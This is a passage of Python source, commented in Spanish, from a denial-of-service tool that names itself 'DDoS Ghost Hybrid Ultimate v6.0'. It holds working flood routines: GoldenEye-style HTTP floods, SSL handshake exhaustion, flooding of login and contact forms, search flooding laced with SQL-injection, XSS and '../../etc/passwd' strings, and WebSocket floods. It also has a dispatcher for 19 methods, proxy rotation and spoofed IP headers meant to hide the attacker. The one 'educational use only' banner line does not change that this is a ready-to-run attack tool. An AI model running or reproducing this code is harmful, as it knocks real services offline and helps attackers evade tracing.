       'Accept-Language': random.choice(['en-US,en;q=0.5', 'es-ES,es;q=0.8', 'fr-FR,fr;q=0.9']),
       'Accept-Encoding': 'gzip, deflate',
       'Connection': 'keep-alive',
       'Keep-Alive': str(random.randint(110, 120)),
       'Cache-Control': random.choice(['no-cache', 'max-age=0', 'must-revalidate']),
       'X-Forwarded-For': generate_fake_ip(),
       'X-Remote-IP': generate_fake_ip(),
       'X-Remote-Addr': generate_fake_ip()
   }
   
   # Configurar proxy
   proxy_url = None
   if use_proxy and proxy_list:
       current_proxy = get_current_proxy()
       if current_proxy and current_proxy['type'] == 'http':
           proxy_url = f"http://{current_proxy['ip']}:{current_proxy['port']}"
   
   try:
       for _ in range(random.randint(10, 20)):
           if not attack_running:
               break
           
           path = random.choice(HTTP_PAYLOADS['generic'])
           params = {
               'q': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(10, 50))),
               'page': random.randint(1, 100),
               'sort': random.choice(['date', 'name', 'size', 'type']),
               'order': random.choice(['asc', 'desc']),
               'limit': random.randint(10, 100),
               'cache': random.randint(1000000, 9999999)
           }
           
           url = f"{target_info['scheme']}://{target_info['host']}:{target_info['port']}{path}"
           
           async with session.get(url, headers=headers, params=params, proxy=proxy_url, timeout=5) as response:
               await response.read()
           
           with lock:
               sent_packets += 1
           
           await asyncio.sleep(0.001)
       
       return True
   except:
       if use_proxy:
           rotate_proxy()
       return False

async def goldeneye_attack(session, target_info, use_proxy=False):
   """Golden Eye HTTP DoS híbrido"""
   global sent_packets
   
   headers = TERMUX_HEADERS.copy()
   headers['User-Agent'] = random.choice(USER_AGENTS)
   headers['Accept-Encoding'] = 'gzip, deflate, compress'
   headers['Accept-Charset'] = 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'
   headers['Cache-Control'] = 'no-cache'
   headers['X-Forwarded-For'] = generate_fake_ip()
   
   # Configurar proxy
   proxy_url = None
   if use_proxy and proxy_list:
       current_proxy = get_current_proxy()
       if current_proxy and current_proxy['type'] == 'http':
           proxy_url = f"http://{current_proxy['ip']}:{current_proxy['port']}"
   
   try:
       tasks = []
       
       for _ in range(random.randint(5, 10)):
           if not attack_running:
               break
           
           method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS'])
           path = random.choice(HTTP_PAYLOADS['generic'])
           url = f"{target_info['scheme']}://{target_info['host']}:{target_info['port']}{path}"
           
           if method == 'GET':
               task = session.get(url, headers=headers, proxy=proxy_url, timeout=5)
           elif method == 'POST':
               data = {'data': 'x' * random.randint(100, 1000)}
               task = session.post(url, headers=headers, data=data, proxy=proxy_url, timeout=5)
           elif method == 'HEAD':
               task = session.head(url, headers=headers, proxy=proxy_url, timeout=5)
           else:
               task = session.options(url, headers=headers, proxy=proxy_url, timeout=5)
           
           tasks.append(task)
       
       responses = await asyncio.gather(*tasks, return_exceptions=True)
       successful = sum(1 for r in responses if not isinstance(r, Exception))
       
       with lock:
           sent_packets += successful
       
       return True
   except:
       if use_proxy:
           rotate_proxy()
       return False

async def ssl_exhaustion_attack(target_info, use_proxy=False):
   """SSL Handshake Exhaustion híbrido"""
   global sent_packets
   
   if target_info['scheme'] != 'https':
       return False
   
   try:
       ssl_context = ssl.create_default_context()
       ssl_context.check_hostname = False
       ssl_context.verify_mode = ssl.CERT_NONE
       
       for _ in range(random.randint(3, 8)):
           if not attack_running:
               break
           
           try:
               if use_proxy and proxy_list:
                   current_proxy = get_current_proxy()
                   if current_proxy and current_proxy['type'] in ['socks4', 'socks5']:
                       sock = setup_proxy_socket(current_proxy)
                       sock.settimeout(2)
                       
                       # Hacer handshake SSL a través del proxy
                       sock.connect((target_info['host'], target_info['port']))
                       ssl_sock = ssl_context.wrap_socket(sock, server_hostname=target_info['host'])
                       
                       with lock:
                           sent_packets += 1
                       
                       time.sleep(random.uniform(5, 15))
                       ssl_sock.close()
                       continue
               
               # Conexión directa
               reader, writer = await asyncio.wait_for(
                   asyncio.open_connection(
                       target_info['host'], 
                       target_info['port'],
                       ssl=ssl_context
                   ),
                   timeout=2
               )
               
               with lock:
                   sent_packets += 1
               
               await asyncio.sleep(random.uniform(5, 15))
               writer.close()
               await writer.wait_closed()
               
           except asyncio.TimeoutError:
               with lock:
                   sent_packets += 1
           except:
               pass
           
           await asyncio.sleep(0.1)
       
       return True
   except:
       if use_proxy:
           rotate_proxy()
       return False

async def form_flooding_attack(session, target_info, use_proxy=False):
   """Form Submission Flooding híbrido"""
   global sent_packets
   
   headers = TERMUX_HEADERS.copy()
   headers['User-Agent'] = random.choice(USER_AGENTS)
   headers['Content-Type'] = 'application/x-www-form-urlencoded'
   headers['Referer'] = f"{target_info['scheme']}://{target_info['host']}"
   
   form_paths = ['/contact', '/login', '/register', '/subscribe', '/search', '/comment', '/feedback']
   
   # Configurar proxy
   proxy_url = None
   if use_proxy and proxy_list:
       current_proxy = get_current_proxy()
       if current_proxy and current_proxy['type'] == 'http':
           proxy_url = f"http://{current_proxy['ip']}:{current_proxy['port']}"
   
   try:
       for _ in range(random.randint(3, 7)):
           if not attack_running:
               break
           
           path = random.choice(form_paths)
           url = f"{target_info['scheme']}://{target_info['host']}:{target_info['port']}{path}"
           
           form_data = {
               'username': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
               'email': f"test{random.randint(1000, 9999)}@example.com",
               'password': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12)),
               'message': 'Test message ' + 'x' * random.randint(100, 500),
               'name': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
               'phone': f"+1{random.randint(1000000000, 9999999999)}",
               'csrf_token': ''.join(random.choices('abcdef0123456789', k=32))
           }
           
           async with session.post(url, headers=headers, data=form_data, proxy=proxy_url, timeout=5) as response:
               await response.read()
           
           with lock:
               sent_packets += 1
           
           await asyncio.sleep(0.05)
       
       return True
   except:
       if use_proxy:
           rotate_proxy()
       return False

async def search_flooding_attack(session, target_info, use_proxy=False):
   """Search Engine Flooding híbrido"""
   global sent_packets
   
   headers = TERMUX_HEADERS.copy()
   headers['User-Agent'] = random.choice(USER_AGENTS)
   headers['Referer'] = f"{target_info['scheme']}://{target_info['host']}"
   
   search_queries = [
       ''.join(random.choices('abcdefghijklmnopqrstuvwxyz ', k=50)),
       '* OR 1=1',
       'a' * 100,
       '"""SELECT * FROM users WHERE"""',
       ''.join(random.choices('0123456789', k=30)),
       'test ' * 20,
       '<?php echo "test"; ?>',
       '<script>alert("test")</script>',
       '../../etc/passwd',
       'admin\' OR \'1\'=\'1'
   ]
   
   search_paths = ['/search', '/?s=', '/buscar', '/find', '/?q=', '/query']
   
   # Configurar proxy
   proxy_url = None
   if use_proxy and proxy_list:
       current_proxy = get_current_proxy()
       if current_proxy and current_proxy['type'] == 'http':
           proxy_url = f"http://{current_proxy['ip']}:{current_proxy['port']}"
   
   try:
       for _ in range(random.randint(5, 12)):
           if not attack_running:
               break
           
           query = random.choice(search_queries)
           path = random.choice(search_paths)
           
           params = {
               'q': query,
               'search': query,
               's': query,
               'query': query,
               'page': random.randint(1, 50),
               'limit': random.randint(50, 200)
           }
           
           url = f"{target_info['scheme']}://{target_info['host']}:{target_info['port']}{path}"
           
           async with session.get(url, headers=headers, params=params, proxy=proxy_url, timeout=5) as response:
               await response.read()
           
           with lock:
               sent_packets += 1
           
           await asyncio.sleep(0.02)
       
       return True
   except:
       if use_proxy:
           rotate_proxy()
       return False

async def websocket_flood_attack(session, target_info, use_proxy=False):
   """Ataque WebSocket Flood híbrido"""
   global sent_packets
   
   if target_info['full_url']:
       ws_url = target_info['full_url'].replace('http://', 'ws://').replace('https://', 'wss://')
   else:
       scheme = 'wss' if target_info['port'] == 443 else 'ws'
       ws_url = f"{scheme}://{target_info['host']}:{target_info['port']}/"
   
   try:
       # Note: aiohttp no soporta proxies con WebSocket fácilmente
       # Usar fallback HTTP si hay proxy
       if use_proxy and proxy_list:
           return await http_flood_attack(session, target_info, 'GET', use_proxy)
       
       async with session.ws_connect(ws_url, timeout=5) as ws:
           for _ in range(random.randint(50, 200)):
               if not attack_running:
                   break
                   
               payloads = [
                   json.dumps({
                       'type': 'message',
                       'data': 'x' * random.randint(100, 1000),
                       'timestamp': time.time()
                   }),
                   json.dumps({
                       'action': 'subscribe',
                       'channel': 'test_' + str(random.randint(1000, 9999)),
                       'payload': 'A' * random.randint(500, 2000)
                   }),
                   'ping_' + str(random.randint(100000, 999999)),
                   '{"cmd":"test","data":"' + 'x' * random.randint(200, 800) + '"}'
               ]
               
               payload = random.choice(payloads)
               await ws.send_str(payload)
               
               with lock:
                   sent_packets += 1
               
               await asyncio.sleep(0.001)
       
       return True
   except:
       # Fallback a HTTP flood
       return await http_flood_attack(session, target_info, 'GET', use_proxy)

# ==================== CLASE ATACANTE HÍBRIDO ====================

class HybridAttacker:
   def __init__(self, target_info, threads, method, use_proxy=False, timing_pattern="normal", stealth_mode=False, rotation_freq=25):
       self.target_info = target_info
       self.threads = threads
       self.method = method
       self.use_proxy = use_proxy
       self.timing_pattern = timing_pattern
       self.stealth_mode = stealth_mode
       self.rotation_freq = rotation_freq
       self.session = None
       
   async def create_session(self):
       """Crear sesión HTTP optimizada híbrida"""
       connector = aiohttp.TCPConnector(
           limit=self.threads * 2,
           limit_per_host=self.threads,
           enable_cleanup_closed=True,
           ssl=False
       )
       
       timeout = aiohttp.ClientTimeout(total=10, connect=5)
       
       self.session = aiohttp.ClientSession(
           connector=connector,
           timeout=timeout,
           headers={'User-Agent': random.choice(USER_AGENTS)}
       )
   
   async def run_hybrid_attack(self):
       """Ejecutar ataque híbrido principal"""
       await self.create_session()
       
       tasks = []
       
       try:
           while attack_running:
               # Seleccionar método de ataque
               if self.method in ['udp_flood', 'tcp_flood', 'random_classic']:
                   # Métodos clásicos del original - usar threading tradicional
                   await asyncio.sleep(0.1)  # Dejar que los threads clásicos trabajen
                   continue
               elif self.method == 'http_classic':
                   task = asyncio.create_task(
                       http_flood_attack(self.session, self.target_info, 'GET', self.use_proxy)
                   )
               elif self.method == 'http_flood':
                   task = asyncio.create_task(
                       http_flood_attack(self.session, self.target_info, 'GET', self.use_proxy)
                   )
               elif self.method == 'slow_post':
                   task = asyncio.create_task(
                       http_flood_attack(self.session, self.target_info, 'POST', self.use_proxy)
                   )
               elif self.method == 'slowloris':
                   task = asyncio.create_task(
                       slowloris_attack(self.target_info, self.use_proxy)
                   )
               elif self.method == 'get_flood':
                   task = asyncio.create_task(
                       get_flood_attack(self.session, self.target_info, self.use_proxy)
                   )
               elif self.method == 'api_flood':
                   task = asyncio.create_task(
                       api_flood_attack(self.session, self.target_info, self.use_proxy)
                   )
               elif self.method == 'rudy_attack':
                   task = asyncio.create_task(
                       rudy_attack(self.target_info, self.use_proxy)
                   )
               elif self.method == 'hulk_attack':
                   task = asyncio.create_task(
                       hulk_attack(self.session, self.target_info, self.use_proxy)
                   )
               elif self.method == 'goldeneye':
                   task = asyncio.create_task(
                       goldeneye_attack(self.session, self.target_info, self.use_proxy)
                   )
               elif self.method == 'ssl_exhaustion':
                   task = asyncio.create_task(
                       ssl_exhaustion_attack(self.target_info, self.use_proxy)
                   )
               elif self.method == 'form_flooding':
                   task = asyncio.create_task(
                       form_flooding_attack(self.session, self.target_info, self.use_proxy)
                   )
               elif self.method == 'search_flooding':
                   task = asyncio.create_task(
                       search_flooding_attack(self.session, self.target_info, self.use_proxy)
                   )
               elif self.method == 'websocket_flood':
                   task = asyncio.create_task(
                       websocket_flood_attack(self.session, self.target_info, self.use_proxy)
                   )
               elif self.method == 'mixed_layer7':
                   # Seleccionar método random de los disponibles
                   available_methods = ['http_flood', 'get_flood', 'hulk_attack', 'goldeneye', 'api_flood']
                   selected_method = random.choice(available_methods)
                   
                   if selected_method == 'http_flood':
                       method_type = random.choice(['GET', 'POST'])
                       task = asyncio.create_task(
                           http_flood_attack(self.session, self.target_info, method_type, self.use_proxy)
                       )
                   elif selected_method == 'get_flood':
                       task = asyncio.create_task(
                           get_flood_attack(self.session, self.target_info, self.use_proxy)
                       )
                   elif selected_method == 'hulk_attack':
                       task = asyncio.create_task(
                           hulk_attack(self.session, self.target_info, self.use_proxy)
                       )
                   elif selected_method == 'goldeneye':
                       task = asyncio.create_task(
                           goldeneye_attack(self.session, self.target_info, self.use_proxy)
                       )
                   else:  # api_flood
                       task = asyncio.create_task(
                           api_flood_attack(self.session, self.target_info, self.use_proxy)
                       )
               elif self.method == 'byob_attack':
                   # BYOB - combinación de múltiples ataques
                   attack_combo = random.choice([
                       lambda: http_flood_attack(self.session, self.target_info, 'GET', self.use_proxy),
                       lambda: api_flood_attack(self.session, self.target_info, self.use_proxy),
                       lambda: form_flooding_attack(self.session, self.target_info, self.use_proxy),
                       lambda: search_flooding_attack(self.session, self.target_info, self.use_proxy),
                       lambda: hulk_attack(self.session, self.target_info, self.use_proxy)
                   ])
                   task = asyncio.create_task(attack_combo())
               elif self.method == 'cache_poisoning':
                   # Cache poisoning usando headers especiales
                   task = asyncio.create_task(
                       hulk_attack(self.session, self.target_info, self.use_proxy)
                   )
               else:
                   # Método por defecto
                   task = asyncio.create_task(
                       http_flood_attack(self.session, self.target_info, 'GET', self.use_proxy)
                   )
               
               tasks.append(task)
               
               # Limitar número de tareas concurrentes
               if len(tasks) >= self.threads:
                   done, pending = await asyncio.wait(
                       tasks, 
                       return_when=asyncio.FIRST_COMPLETED,
                       timeout=1.0
                   )
                   tasks = list(pending)
               
               # Pausa con patrón de timing
               timing_range = TIMING_PATTERNS.get(self.timing_pattern, TIMING_PATTERNS['normal'])
               sleep_time = random.uniform(timing_range[0], timing_range[1])
               await asyncio.sleep(sleep_time)
               
       except asyncio.CancelledError:
           pass
       finally:
           # Cancelar tareas pendientes
           for task in tasks:
               task.cancel()
           
           if self.session:
               await self.session.close()

# ==================== MONITOR DE BANDWIDTH ====================

def monitor_bandwidth():
   """Monitor de ancho de banda optimizado (del original)"""
   global bandwidth_monitor
   
   while attack_running:
       try:
           import psutil
           net_io = psutil.net_io_counters()
           bandwidth_monitor.append({
               'timestamp': time.time(),
               'bytes_sent': net_io.bytes_sent,
               'bytes_recv': net_io.bytes_recv
           })
           
           # Mantener solo los últimos 60 registros
           if len(bandwidth_monitor) > 60:
               bandwidth_monitor = bandwidth_monitor[-60:]
               
       except:
           pass
       
       time.sleep(1)

def get_network_speed():
   """Calcular velocidad de red actual"""
   if len(bandwidth_monitor) < 2:
       return 0, 0
   
   current = bandwidth_monitor[-1]
   previous = bandwidth_monitor[-2]
   
   time_diff = current['timestamp'] - previous['timestamp']
   if time_diff <= 0:
       return 0, 0
   
   upload_speed = (current['bytes_sent'] - previous['bytes_sent']) / time_diff
   download_speed = (current['bytes_recv'] - previous['bytes_recv']) / time_diff
   
   return upload_speed, download_speed

# ==================== DISPLAY HÍBRIDO ====================

def update_display_hybrid(target_info, method, threads, use_proxy=False, timing_pattern="normal"):
   """Actualiza la visualización en tiempo real híbrida"""
   global sent_packets, start_time, proxy_rotation_counter

   while attack_running:
       duration = time.time() - start_time
       if duration > 0:
           pps = sent_packets / duration
       else:
           pps = 0

       upload_speed, download_speed = get_network_speed()

       clear_screen()
       print(f"{Colors.BOLD}{Colors.PURPLE}╔══════════════════════════════════════════════════════╗{Colors.ENDC}")
       print(f"{Colors.BOLD}{Colors.PURPLE}║     DoS Ghost Hybrid Ultimate v6.0 - Sin Root     ║{Colors.ENDC}")
       print(f"{Colors.BOLD}{Colors.PURPLE}╚══════════════════════════════════════════════════════╝{Colors.ENDC}")
       
       print(f"{Colors.BLUE}[*] Objetivo: {Colors.RED}{target_info['host']}:{target_info['port']}{Colors.ENDC}")
       print(f"{Colors.BLUE}[*] Método: {Colors.CYAN}{ATTACK_METHODS.get(method, method)}{Colors.ENDC}")
       print(f"{Colors.BLUE}[*] Hilos: {Colors.YELLOW}{threads}{Colors.ENDC}")
       print(f"{Colors.BLUE}[*] Tiempo transcurrido: {Colors.YELLOW}{duration:.2f}s{Colors.ENDC}")
       print(f"{Colors.BLUE}[*] Paquetes enviados: {Colors.YELLOW}{sent_packets:,}{Colors.ENDC}")
       print(f"{Colors.BLUE}[*] Velocidad: {Colors.YELLOW}{pps:.2f} pps{Colors.ENDC}")
       print(f"{Colors.BLUE}[*] Patrón de timing: {Colors.CYAN}{timing_pattern}{Colors.ENDC}")

       if use_proxy and len(proxy_list) > 0:
           print(f"{Colors.BLUE}[*] Modo anónimo: {Colors.GREEN}Activo{Colors.ENDC}")
           print(f"{Colors.BLUE}[*] Proxies cargados: {Colors.YELLOW}{len(proxy_list)}{Colors.ENDC}")
           print(f"{Colors.BLUE}[*] Rotaciones de proxy: {Colors.YELLOW}{proxy_rotation_counter}{Colors.ENDC}")
           if current_proxy_index < len(proxy_list):
               current_proxy = proxy_list[current_proxy_index]
               proxy_type = current_proxy['type']
               proxy_ip = current_proxy['ip']
               proxy_port = current_proxy['port']
               print(f"{Colors.BLUE}[*] Proxy actual: {Colors.CYAN}{proxy_type}://{proxy_ip}:{proxy_port}{Colors.ENDC}")
       else:
           print(f"{Colors.BLUE}[*] Modo anónimo: {Colors.RED}Desactivado{Colors.ENDC}")

       if upload_speed > 0:
           print(f"{Colors.BLUE}[*] Upload: {Colors.GREEN}{upload_speed/1024:.2f} KB/s{Colors.ENDC}")
           print(f"{Colors.BLUE}[*] Download: {Colors.GREEN}{download_speed/1024:.2f} KB/s{Colors.ENDC}")

       # Sistema de recursos
       try:
           import psutil
           cpu_percent = psutil.cpu_percent()
           memory = psutil.virtual_memory()
           print(f"{Colors.BLUE}[*] CPU: {Colors.CYAN}{cpu_percent:.1f}%{Colors.ENDC}")
           print(f"{Colors.BLUE}[*] RAM: {Colors.CYAN}{memory.percent:.1f}%{Colors.ENDC}")
       except:
           pass

       print(f"{Colors.GREEN}[*] Ataque híbrido en progreso... Presiona CTRL+C para detener{Colors.ENDC}")
       time.sleep(1)

# ==================== CONFIGURACIÓN DE ENTORNO DE PROXIES ====================

def setup_proxy_environment(proxy_file=None, auto_proxy=False, verify_proxies=False):
   """Configura el entorno de proxies con verificación opcional (del original)"""
   global proxy_list

   if proxy_file:
       print(f"{Colors.BLUE}[*] Cargando proxies desde archivo: {Colors.YELLOW}{proxy_file}{Colors.ENDC}")
       proxy_list = load_proxies_from_file(proxy_file)
   elif auto_proxy:
       print(f"{Colors.BLUE}[*] Obteniendo lista de proxies gratuitos...{Colors.ENDC}")
       proxy_list = get_free_proxies()

   if proxy_list:
       print(f"{Colors.GREEN}[+] Se cargaron {Colors.BOLD}{len(proxy_list)}{Colors.ENDC}{Colors.GREEN} proxies{Colors.ENDC}")

       if verify_proxies:
           proxy_list = verify_and_score_proxies(proxy_list)
           if proxy_list:
               print(f"{Colors.GREEN}[+] {len(proxy_list)} proxies verificados y listos para usar{Colors.ENDC}")
           else:
               print(f"{Colors.RED}[!] No se encontraron proxies funcionales{Colors.ENDC}")
               return False

       return True
   else:
       print(f"{Colors.YELLOW}[!] No se pudieron cargar proxies. El ataque no será anónimo.{Colors.ENDC}")
       return False

def load_proxies_from_file(file_path):
   """Carga proxies desde un archivo de texto con mejor manejo (del original)"""
   proxies = []

   try:
       with open(file_path, 'r') as f:
           lines = f.readlines()

       for line_num, line in enumerate(lines, 1):
           line = line.strip()
           if not line or line.startswith('#'):
               continue

           try:
               parts = line.split(':')
               if len(parts) >= 2:
                   ip = parts[0]
                   port = int(parts[1])
                   proxy_type = 'http'  # tipo por defecto

                   if len(parts) >= 3:
                       if parts[2].lower() in ['http', 'socks4', 'socks5']:
                           proxy_type = parts[2].lower()
                       elif parts[0].lower() in ['http', 'socks4', 'socks5']:
                           proxy_type = parts[0].lower()
                           ip = parts[1]
                           port = int(parts[2])

                   proxies.append({
                       'ip': ip,
                       'port': port,
                       'type': proxy_type
                   })
           except ValueError:
               print(f"{Colors.YELLOW}[!] Línea {line_num} ignorada (formato inválido): {line}{Colors.ENDC}")
               continue

   except Exception as e:
       print(f"{Colors.RED}[!] Error al cargar el archivo de proxies: {str(e)}{Colors.ENDC}")

   return proxies

# ==================== FUNCIÓN DE ATAQUE HÍBRIDO PRINCIPAL ====================

async def start_hybrid_attack(target_info, threads, method, use_proxy=False, timing_pattern="normal", stealth_mode=False, rotation_freq=25):
   """Inicia el ataque híbrido con configuraciones avanzadas"""
   global attack_running, start_time

   start_time = time.time()
   attack_running = True

   signal.signal(signal.SIGINT, signal_handler)

   # Iniciar monitor de bandwidth
   bandwidth_thread = threading.Thread(target=monitor_bandwidth, daemon=True)
   bandwidth_thread.start()

   # Iniciar display híbrido
   display_thread = threading.Thread(
       target=update_display_hybrid,
       args=(target_info, method, threads, use_proxy, timing_pattern),
       daemon=True
   )
   display_thread.start()

   # Para métodos clásicos, usar threading tradicional
   if method in ['udp_flood', 'tcp_flood', 'random_classic']:
       classic_threads = []
       
       # Convertir target_info a formato clásico
       if target_info['type'] == 'url':
           target_ip = target_info['host']
           target_port = target_info['port']
       else:
           target_ip = target_info['host']
           target_port = target_info['port']
       
       # Determinar tipo de socket clásico
       if method == 'udp_flood':
           sock_type = 'udp'
       elif method == 'tcp_flood':
           sock_type = 'tcp'
       elif method == 'random_classic':
           sock_type = 'random'
       else:
           sock_type = 'tcp'
       
       # Crear threads clásicos
       for _ in range(threads):
           thread = threading.Thread(
               target=attack_thread,
               args=(target_ip, target_port, sock_type, use_proxy, timing_pattern, stealth_mode, rotation_freq),
               daemon=True
           )
           classic_threads.append(thread)
           thread.start()
       
       # Esperar mientras el ataque clásico corre
       try:
           while attack_running:
               time.sleep(0.1)
       except KeyboardInterrupt:
           signal_handler(None, None)
   
   else:
       # Para métodos Layer 7, usar el atacante híbrido
       attacker = HybridAttacker(target_info, threads, method, use_proxy, timing_pattern, stealth_mode, rotation_freq)
       
       try:
           await attacker.run_hybrid_attack()
       except KeyboardInterrupt:
           signal_handler(None, None)

# ==================== BANNER Y MENÚS ====================

def show_hybrid_banner():
   """Muestra el banner híbrido del programa"""
   system_info = detect_system_resources()
   now = datetime.now()

   clear_screen()
   print(f"{Colors.BOLD}{Colors.PURPLE}╔══════════════════════════════════════════════════════╗{Colors.ENDC}")
   print(f"{Colors.BOLD}{Colors.PURPLE}║     DDoS Ghost Hybrid Ultimate v6.0 - Sin Root     ║{Colors.ENDC}")
   print(f"{Colors.BOLD}{Colors.PURPLE}╚══════════════════════════════════════════════════════╝{Colors.ENDC}")
   print(f"{Colors.BLUE}[*] Versión: {Colors.GREEN}6.0.0 Hybrid Ultimate{Colors.ENDC}")
   print(f"{Colors.BLUE}[*] Fecha: {Colors.GREEN}{now.strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}")
   print(f"{Colors.BLUE}[*] Sistema: {Colors.GREEN}{'Termux Android' if IS_TERMUX else 'Linux/Windows'}{Colors.ENDC}")
   print(f"{Colors.BLUE}[*] CPU Cores: {Colors.GREEN}{system_info['cpu_count']}{Colors.ENDC}")
   print(f"{Colors.BLUE}[*] RAM: {Colors.GREEN}{system_info['memory_mb']} MB{Colors.ENDC}")
   print(f"{Colors.BLUE}[*] Hilos Recomendados: {Colors.GREEN}{system_info['recommended_threads']}{Colors.ENDC}")
   print(f"{Colors.BLUE}[*] Métodos: {Colors.GREEN}19 métodos híbridos (UDP/TCP/HTTP/Layer7){Colors.ENDC}")
   print(f"{Colors.BLUE}[*] Características: {Colors.GREEN}Proxies, reportes, configuración persistente{Colors.ENDC}")
   print(f"{Colors.GREEN}[*] Híbrido: Combina lo mejor del original + 15 métodos nuevos{Colors.ENDC}")
   print(f"{Colors.RED}[!] Solo para uso educativo y entornos controlados{Colors.ENDC}")
   print(f"{Colors.PURPLE}═════════════════════════════════════════════════════════{Colors.ENDC}\n")

def show_methods_menu():
   """Muestra todos los métodos disponibles organizados"""
   print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════ MÉTODOS HÍBRIDOS DISPONIBLES ═══════════{Colors.ENDC}")
   print(f"{Colors.BOLD}{Colors.YELLOW}MÉTODOS CLÁSICOS (del original):{Colors.ENDC}")
   classic_methods = ['udp_flood', 'tcp_flood', 'http_classic', 'random_classic']
   for method in classic_methods:
       if method in ATTACK_METHODS:
           print(f"{Colors.GREEN}[{method}]{Colors.ENDC} - {ATTACK_METHODS[method]}")
   
   print(f"\n{Colors.BOLD}{Colors.YELLOW}MÉTODOS LAYER 7 AVANZADOS:{Colors.ENDC}")
   layer7_methods = [k for k in ATTACK_METHODS.keys() if k not in classic_methods]
   for method in layer7_methods:
       print(f"{Colors.CYAN}[{method}]{Colors.ENDC} - {ATTACK_METHODS[method]}")
   
   print(f"{Colors.CYAN}════════════════════════════════════════════════════════{Colors.ENDC}\n")

def show_reports():
   """Muestra reportes anteriores (del original)"""
   try:
       if not os.path.exists(reports_file):
           print(f"{Colors.YELLOW}[!] No se encontraron reportes anteriores{Colors.ENDC}")
           return

       with open(reports_file, 'r') as f:
           reports = json.load(f)

       if not reports:
           print(f"{Colors.YELLOW}[!] No hay reportes disponibles{Colors.ENDC}")
           return

       print(f"\n{Colors.BOLD}{Colors.BLUE}═══════════ Reportes Anteriores ═══════════{Colors.ENDC}")

       for i, report in enumerate(reports[-10:], 1):
           timestamp = datetime.fromisoformat(report['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
           print(f"{Colors.GREEN}[{i}] {timestamp} - {report.get('version', 'v6.0')}{Colors.ENDC}")
           print(f"    Duración: {report['duration']}s | Paquetes: {report['packets_sent']:,} | PPS: {report['packets_per_second']}")
           print(f"    Proxies: {report['proxies_used']} | Rotaciones: {report['proxy_rotations']}")

       print(f"{Colors.BLUE}═════════════════════════════════════════{Colors.ENDC}\n")

   except Exception as e:
       print(f"{Colors.RED}[!] Error al leer reportes: {str(e)}{Colors.ENDC}")

def show_config_menu():
   """Muestra menú de configuración avanzada (del original mejorado)"""
   config = load_config()

   while True:
       clear_screen()
       print(f"{Colors.BOLD}{Colors.CYAN}╔═══════════ Configuración Híbrida ═══════════╗{Colors.ENDC}")
       print(f"{Colors.CYAN}║                                               ║{Colors.ENDC}")
       print(f"{Colors.CYAN}║  1. Hilos por defecto: {config['default_threads']:<20}     ║{Colors.ENDC}")
       print(f"{Colors.CYAN}║  2. Método por defecto: {config['default_method']:<18}     ║{Colors.ENDC}")
       print(f"{Colors.CYAN}║  3. Patrón de timing: {config['timing_pattern']:<20}       ║{Colors.ENDC}")
       print(f"{Colors.CYAN}║  4. Frecuencia rotación: {config['proxy_rotation_freq']:<16}     ║{Colors.ENDC}")
       print(f"{Colors.CYAN}║  5. Rotación User-Agent: {str(config['user_agent_rotation']):<15}     ║{Colors.ENDC}")
       print(f"{Colors.CYAN}║  6. Modo sigiloso: {str(config['stealth_mode']):<22}     ║{Colors.ENDC}")
       print(f"{Colors.CYAN}║  7. Evasión avanzada: {str(config['advanced_evasion']):<18}     ║{Colors.ENDC}")
       print(f"{Colors.CYAN}║  8. Verificar proxies: {str(config['auto_proxy_verification']):<17}     ║{Colors.ENDC}")
       print(f"{Colors.CYAN}║                                               ║{Colors.ENDC}")
       print(f"{Colors.CYAN}║  s. Guardar configuración                     ║{Colors.ENDC}")
       print(f"{Colors.CYAN}║  q. Volver al menú principal                  ║{Colors.ENDC}")
       print(f"{Colors.CYAN}╚═══════════════════════════════════════════════╝{Colors.ENDC}")

       choice = input(f"\n{Colors.BLUE}[?] Selecciona una opción: {Colors.ENDC}").lower()

       if choice == '1':
           try:
               threads = int(input(f"{Colors.BLUE}[?] Número de hilos (1-100): {Colors.ENDC}"))
               if 1 <= threads <= 100:
                   config['default_threads'] = threads
               else:
                   print(f"{Colors.RED}[!] Valor debe estar entre 1 y 100{Colors.ENDC}")
                   input("Presiona Enter para continuar...")
           except ValueError:
               print(f"{Colors.RED}[!] Valor inválido{Colors.ENDC}")
               input("Presiona Enter para continuar...")

       elif choice == '2':
           print("Métodos disponibles:")
           for method in ATTACK_METHODS.keys():
               print(f"  - {method}")
           method = input(f"{Colors.BLUE}[?] Método: {Colors.ENDC}").lower()
           if method in ATTACK_METHODS:
               config['default_method'] = method
           else:
               print(f"{Colors.RED}[!] Método inválido{Colors.ENDC}")
               input("Presiona Enter para continuar...")

       elif choice == '3':
           print("Patrones disponibles: aggressive, normal, stealth, human_like")
           pattern = input(f"{Colors.BLUE}[?] Patrón de timing: {Colors.ENDC}").lower()
           if pattern in TIMING_PATTERNS:
               config['timing_pattern'] = pattern
           else:
               print(f"{Colors.RED}[!] Patrón inválido{Colors.ENDC}")
               input("Presiona Enter para continuar...")

       elif choice == '4':
           try:
               freq = int(input(f"{Colors.BLUE}[?] Frecuencia de rotación (10-100): {Colors.ENDC}"))
               if 10 <= freq <= 100:
                   config['proxy_rotation_freq'] = freq
               else:
                   print(f"{Colors.RED}[!] Valor debe estar entre 10 y 100{Colors.ENDC}")
                   input("Presiona Enter para continuar...")
           except ValueError:
               print(f"{Colors.RED}[!] Valor inválido{Colors.ENDC}")
               input("Presiona Enter para continuar...")

       elif choice == '5':
           config['user_agent_rotation'] = not config['user_agent_rotation']

       elif choice == '6':
           config['stealth_mode'] = not config['stealth_mode']

       elif choice == '7':
           config['advanced_evasion'] = not config['advanced_evasion']

       elif choice == '8':
           config['auto_proxy_verification'] = not config['auto_proxy_verification']

       elif choice == 's':
           save_config(config)
           input("Presiona Enter para continuar...")

       elif choice == 'q':
           break

def install_dependencies():
   """Instala las dependencias necesarias si faltan"""
   try:
       import aiohttp
       import psutil
       import socks
       print(f"{Colors.GREEN}[+] Todas las dependencias están instaladas{Colors.ENDC}")
   except ImportError as e:
       missing = str(e).split("'")[1] if "'" in str(e) else "dependencias"
       print(f"{Colors.YELLOW}[!] Instalando {missing}...{Colors.ENDC}")
       
       dependencies = ['aiohttp', 'psutil', 'requests', 'pysocks']
       
       try:
